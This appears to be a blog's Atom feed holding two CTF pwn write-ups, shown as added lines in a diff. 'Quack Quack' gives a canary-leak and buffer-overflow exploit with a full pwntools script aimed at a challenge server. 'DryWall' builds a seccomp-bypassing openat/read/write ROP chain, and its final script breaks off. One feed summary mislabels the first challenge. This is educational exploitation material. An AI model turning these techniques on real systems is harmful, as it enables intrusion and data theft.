@@ -1,0 +1,478 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="https://nopnopx90.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://nopnopx90.github.io/" rel="alternate" type="text/html" /><updated>2025-08-07T18:03:56+05:30</updated><id>https://nopnopx90.github.io/feed.xml</id><title type="html">NopNop0x90’s Blog</title><subtitle>Security research and CTF writeups</subtitle><entry><title type="html">Quack Quack - from ApocalypseCTF</title><link href="https://nopnopx90.github.io/writeups/QuackQuack-apocalypseCTF/" rel="alternate" type="text/html" title="Quack Quack - from ApocalypseCTF" /><published>2025-03-23T00:00:00+05:30</published><updated>2025-03-23T00:00:00+05:30</updated><id>https://nopnopx90.github.io/writeups/QuackQuack-apocalypseCTF</id><content type="html" xml:base="https://nopnopx90.github.io/writeups/QuackQuack-apocalypseCTF/"><![CDATA[<h1 id="quack-quack---pwn-challenge-writeup">Quack Quack - Pwn Challenge Writeup</h1>
+
+<p><strong>Challenge Name</strong>: Quack Quack<br />
+<strong>Category</strong>: Pwn<br />
+<em>(Kept this writeup straightforward and on point)</em></p>
+
+<hr />
+
+<h2 id="challenge-description">Challenge Description</h2>
+
+<p>On the quest to reclaim the Dragon’s Heart, the wicked Lord Malakar has cursed the villagers, turning them into ducks! Join Sir Alaric in finding a way to defeat them without causing harm. Quack Quack, it’s time to face the Duck!</p>
+
+<hr />
+
+<h2 id="initial-recon">Initial Recon</h2>
+
+<p>Binary starts with:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Quack the Duck!
+
+&gt;
+</code></pre></div></div>
+
+<p>It reads 102 bytes from you, checks if you included “Quack Quack “, and if not, exits with an error. If you pass the check, it uses <code class="language-plaintext highlighter-rouge">%s</code> to print something from your input.</p>
+
+<p>Classic setup for a <strong>stack canary leak + buffer overflow</strong>. The goal? Defeat the duck and call the hidden <code class="language-plaintext highlighter-rouge">duck_attack()</code> function.</p>
+
+<hr />
+
+<h2 id="decompiled-function-ghidra-output">Decompiled Function (Ghidra Output)</h2>
+
+<p>Here’s the function <code class="language-plaintext highlighter-rouge">duckling()</code>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">duckling</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">off</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_88</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_80</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_78</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_70</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_68</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_60</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_58</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_50</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_48</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_40</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_38</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_30</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_28</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_20</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
+
+  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+  <span class="n">local_88</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">local_80</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">local_78</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">local_70</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">local_68</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">local_60</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">local_58</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">local_50</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">local_48</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">local_40</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">local_38</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">local_30</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">local_28</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">local_20</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Quack the Duck!</span><span class="se">\n\n</span><span class="s">&gt; "</span><span class="p">);</span>
+  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">local_88</span><span class="p">,</span> <span class="mi">102</span><span class="p">);</span>
+  <span class="n">off</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_88</span><span class="p">,</span> <span class="s">"Quack Quack "</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">off</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">error</span><span class="p">(</span><span class="s">"Where are your Quack Manners?!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mh">0x520</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Quack Quack %s, ready to fight the Duck?</span><span class="se">\n\n</span><span class="s">&gt; "</span><span class="p">,</span> <span class="n">off</span> <span class="o">+</span> <span class="mi">32</span><span class="p">);</span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">local_68</span><span class="p">,</span> <span class="mi">106</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Did you really expect to win a fight against a Duck?!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+    <span class="n">__stack_chk_fail</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h3 id="key-points">Key Points:</h3>
+<ul>
+  <li>Reads 102 bytes into <code class="language-plaintext highlighter-rouge">local_88</code> (which is stack memory).</li>
+  <li>Checks for “Quack Quack “ with <code class="language-plaintext highlighter-rouge">strstr()</code>.</li>
+  <li>Then prints from <code class="language-plaintext highlighter-rouge">off + 32</code> with <code class="language-plaintext highlighter-rouge">%s</code>.</li>
+  <li><code class="language-plaintext highlighter-rouge">%s</code> stops at NULL, meaning <strong>stack canary leak is tricky</strong>.</li>
+  <li>Ends with a standard stack canary check.</li>
+</ul>
+
+<p>Discovered win function: <code class="language-plaintext highlighter-rouge">duck_attack()</code> at <code class="language-plaintext highlighter-rouge">0x40137f</code>. That’s the target for RIP.</p>
+
+<hr />
+
+<h2 id="exploit-strategy">Exploit Strategy</h2>
+
+<h3 id="canary-leak-problems">Canary Leak Problems</h3>
+
+<ul>
+  <li>The canary ends with a <strong>NULL byte</strong>, so <code class="language-plaintext highlighter-rouge">%s</code> cuts off before printing the full 8 bytes.</li>
+  <li>Theory says 88 bytes of padding should align us before the canary.</li>
+  <li>Reality: <code class="language-plaintext highlighter-rouge">%s</code> refuses to leak it properly with <code class="language-plaintext highlighter-rouge">A*88</code>.</li>
+</ul>
+
+<h3 id="the-fix">The Fix</h3>
+
+<ul>
+  <li>Send <code class="language-plaintext highlighter-rouge">A*89 + "Quack Quack "</code>.</li>
+  <li>This tricks <code class="language-plaintext highlighter-rouge">%s</code> into starting exactly at the canary, leaking 8 bytes.</li>
+  <li>Due to the NULL byte, we only get <strong>7 useful bytes</strong> and 1 garbage byte that is most significat byte .</li>
+</ul>
+
+<h3 id="adjust-the-leak">Adjust the Leak</h3>
+
+<ul>
+  <li>Strip off the <strong>MSB (garbage byte)</strong>.</li>
+  <li>Append a NULL byte to reconstruct the correct canary.</li>
+  <li>Now we have a valid canary to use in the overflow.</li>
+</ul>
+
+<hr />
+
+<h2 id="payloads-and-explanation-disclaimer-i-suck-at-coding-xd">Payloads and Explanation (disclaimer: i suck at coding XD)</h2>
+
+<h3 id="payload-1-leak-canary">Payload 1 (Leak Canary)</h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">padding</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">89</span>
+<span class="n">quack_str</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">Quack Quack </span><span class="sh">"</span>
+<span class="n">filler</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">B</span><span class="sh">'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">102</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">padding</span><span class="p">)</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">quack_str</span><span class="p">))</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">quack_str</span> <span class="o">+</span> <span class="n">filler</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Send this payload first.</li>
+  <li>It gets us a leak of 8 bytes.</li>
+</ul>
+
+<p>Fix the canary:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">canary</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
+<span class="n">canary_fixed</span> <span class="o">=</span> <span class="p">(</span><span class="n">canary</span> <span class="o">&amp;</span> <span class="mh">0x00FFFFFFFFFFFFFF</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span>
+</code></pre></div></div>
+
+<hr />
+
+<h3 id="payload-2-overflow">Payload 2 (Overflow)</h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">B</span><span class="sh">"</span><span class="o">*</span><span class="mi">88</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">canary_fixed</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x40137f</span><span class="p">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>88 bytes padding</li>
+  <li>Valid canary</li>
+  <li>Fake RBP</li>
+  <li>Jump to <code class="language-plaintext highlighter-rouge">duck_attack()</code></li>
+</ul>
+
+<hr />
+
+<h2 id="my-garbage-exploit-script-skill-issue-hehe">My Garbage Exploit Script (Skill Issue hehe)</h2>
+
+<p>Okay, here’s my terrible script. It’s functional but ugly — because I’m a bad programmer kek:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">94.237.60.63</span><span class="sh">'</span><span class="p">,</span> <span class="mi">51435</span><span class="p">)</span>
+
+<span class="n">padding</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">89</span>
+<span class="n">quack_str</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">Quack Quack </span><span class="sh">"</span>
+<span class="n">filler</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">B</span><span class="sh">'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">102</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">padding</span><span class="p">)</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">quack_str</span><span class="p">))</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">quack_str</span> <span class="o">+</span> <span class="n">filler</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Quack Quack </span><span class="sh">'</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Leaked data: </span><span class="si">{</span><span class="n">leak</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">canary</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Canary: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="n">canary_adjusted</span> <span class="o">=</span> <span class="p">(</span><span class="n">canary</span> <span class="o">&amp;</span> <span class="mh">0x00FFFFFFFFFFFFFF</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Adjusted Canary: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">canary_adjusted</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
+<span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">B</span><span class="sh">"</span><span class="o">*</span><span class="mi">88</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">canary_adjusted</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x40137f</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="final-thoughts">Final Thoughts</h2>
+
+<p>Leaking the canary was a bit cursed due to <code class="language-plaintext highlighter-rouge">%s</code> and NULL-byte interactions, but once that hurdle was cleared, everything fell into place.</p>
+
+<p>Solid pwn challenge. Now, hand over that PlayStation. Quack Quack. 🦆</p>]]></content><author><name>NopNop0x90</name></author><category term="PWN" /><category term="userland" /><category term="pwn" /><category term="binary-exploitation" /><summary type="html"><![CDATA[Detailed writeup of the Drywall challenge from ApocalypseCTF 2025.]]></summary></entry><entry><title type="html">DryWall – writeup 🧱🔨 from Wolvctf</title><link href="https://nopnopx90.github.io/writeups/wolvctf-drywall/" rel="alternate" type="text/html" title="DryWall – writeup 🧱🔨 from Wolvctf" /><published>2025-03-23T00:00:00+05:30</published><updated>2025-03-23T00:00:00+05:30</updated><id>https://nopnopx90.github.io/writeups/wolvctf-drywall</id><content type="html" xml:base="https://nopnopx90.github.io/writeups/wolvctf-drywall/"><![CDATA[<h1 id="drywall--writeup--from-wolvctf">DryWall – writeup 🧱🔨 from Wolvctf</h1>
+
+<p><strong>Challenge Name</strong>: DryWall
+<strong>Category</strong>: Pwn Userland</p>
+
+<hr />
+
+<h2 id="tldr">TL;DR</h2>
+<p>We bypassed the seccomp , leaked the PIE base, built a ROP chain to <code class="language-plaintext highlighter-rouge">openat</code>, <code class="language-plaintext highlighter-rouge">read</code>, and <code class="language-plaintext highlighter-rouge">write</code> the flag file directly, all while staying within syscall restrictions. Oh, and no <code class="language-plaintext highlighter-rouge">open()</code> allowed. Time for <code class="language-plaintext highlighter-rouge">openat()</code> magic.</p>
+
+<hr />
+<h2 id="disclaimer--horrible-scripting-ahead-d">Disclaimer : Horrible scripting ahead :D</h2>
+
+<h2 id="peeking-at-the-source">Peeking at the Source</h2>
+
+<p>Here’s the key section from the provided C code:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">30</span><span class="p">];</span>
+<span class="p">...</span>
+<span class="n">fgets</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">"Good luck %s &lt;|;)</span><span class="err">
+</span><span class="s">"</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">"%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">main</span><span class="p">);</span>
+<span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x256</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p><strong>buffer overflow?</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">char buf[256];</code> is fed into <code class="language-plaintext highlighter-rouge">fgets(buf, 0x256, stdin);</code></li>
+  <li>But 0x256 = 598 bytes are read into a 256-byte buffer.</li>
+  <li>Classic <strong>buffer overflow</strong> and more than enough room to build a ROP chain.</li>
+</ul>
+
+<hr />
+
+<h2 id="seccomp">Seccomp</h2>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_KILL</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">execve</span><span class="p">),</span><span class="mi">0</span><span class="p">);</span>
+<span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_KILL</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">open</span><span class="p">),</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">...</span>
+<span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_KILL</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">process_vm_writev</span><span class="p">),</span><span class="mi">0</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Basically, they blocked:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">execve</code>, <code class="language-plaintext highlighter-rouge">open</code>, <code class="language-plaintext highlighter-rouge">execveat</code></li>
+  <li>Variants of <code class="language-plaintext highlighter-rouge">readv</code>, <code class="language-plaintext highlighter-rouge">writev</code>, <code class="language-plaintext highlighter-rouge">process_vm_*</code></li>
+</ul>
+
+<p>But they <em>didn’t block</em>:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">openat</code></li>
+  <li><code class="language-plaintext highlighter-rouge">read</code></li>
+  <li><code class="language-plaintext highlighter-rouge">write</code></li>
+</ul>
+
+<p>We can work with this.</p>
+
+<hr />
+
+<h2 id="the-plan">The Plan</h2>
+
+<p>Here’s what we need to do:</p>
+<ol>
+  <li><strong>Leak the PIE base</strong></li>
+  <li><strong>Find or inject the flag file path</strong> – <code class="language-plaintext highlighter-rouge">/home/user/flag.txt</code></li>
+  <li><strong>Build ROP chain</strong> using <code class="language-plaintext highlighter-rouge">openat</code>, <code class="language-plaintext highlighter-rouge">read</code>, <code class="language-plaintext highlighter-rouge">write</code> since <code class="language-plaintext highlighter-rouge">open()</code> is blocked.</li>
+  <li><strong>Exploit the buffer overflow</strong> to hijack control flow.</li>
+</ol>
+
+<hr />
+
+<h2 id="pie-base-leak">PIE Base Leak</h2>
+
+<p>From the binary:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">printf</span><span class="p">(</span><span class="s">"%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">main</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Nice. They’re handing us the address of <code class="language-plaintext highlighter-rouge">main</code> post-PIE randomization. With that, we can calculate the binary’s base.</p>
+
+<p>In the exploit:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">main_leak</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">().</span><span class="nf">strip</span><span class="p">()</span>
+<span class="n">main_addr</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">main_leak</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">main_offset</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">'</span><span class="s">main</span><span class="sh">'</span><span class="p">]</span>
+<span class="n">binary_base</span> <span class="o">=</span> <span class="n">main_addr</span> <span class="o">-</span> <span class="n">main_offset</span>
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="injecting-the-flag-path">Injecting the Flag Path</h2>
+
+<p>Here’s the fun part – the program asks for your name first.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">puts</span><span class="p">(</span><span class="s">"What is your name, epic H4x0r?"</span><span class="p">);</span>
+<span class="n">fgets</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>We can directly feed <code class="language-plaintext highlighter-rouge">/home/user/flag.txt\0</code> into the <code class="language-plaintext highlighter-rouge">name</code> buffer. Since we know <code class="language-plaintext highlighter-rouge">name</code> is global (<code class="language-plaintext highlighter-rouge">.bss</code>) and we can compute its runtime address, we just point <code class="language-plaintext highlighter-rouge">openat()</code> to it.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ objdump -t chall | grep name 
+0000000000004050 l     O .bss	000000000000001e              _ZL4name
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="rop-time--cracking-the-wall">ROP Time – Cracking the Wall</h2>
+
+<p>We’re now ready to build our ROP chain.</p>
+
+<h3 id="openatat_fdcwd-name_addr-o_rdonly">openat(AT_FDCWD, name_addr, O_RDONLY)</h3>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">AT_FDCWD</code> is -100 → <code class="language-plaintext highlighter-rouge">0xffffff9c</code></li>
+  <li>syscall number for <code class="language-plaintext highlighter-rouge">openat</code> → 257</li>
+  <li>We’re using <strong>syscall gadget</strong> (gifted in the binary via <code class="language-plaintext highlighter-rouge">gift()</code> function!)</li>
+</ul>
+
+<h3 id="read3-name_addr-0x100">read(3, name_addr, 0x100)</h3>
+
+<ul>
+  <li>FD = 3 → file descriptor returned from <code class="language-plaintext highlighter-rouge">openat</code></li>
+</ul>
+
+<h3 id="write1-name_addr-0x100">write(1, name_addr, 0x100)</h3>
+
+<ul>
+  <li>Write flag contents to stdout.</li>
+</ul>
+
+<p>ROP chain:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">AT_FDCWD</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffffff</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_pop_r15_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">name_addr</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># junk for r15
+</span><span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdx_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">O_RDONLY</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rax_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">257</span><span class="p">)</span>  <span class="c1"># openat
+</span><span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span>
+
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>  
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_pop_r15_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">name_addr</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdx_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rax_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># syscall read
+</span><span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span>
+
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rax_ret</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  <span class="c1"># syscall write
+</span><span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span>
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="payload-assembly">Payload Assembly</h2>
+
+<p>Buffer overflow kicks in here:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">280</span>  <span class="c1"># Offset to return address
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">rop</span>
+</code></pre></div></div>
+
+<p>After sending this, we enter <strong>interactive mode</strong> and get the flag.</p>
+
+<hr />
+
+<h2 id="complete-exploit-script">Complete exploit script:</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./chall</span><span class="sh">'</span>
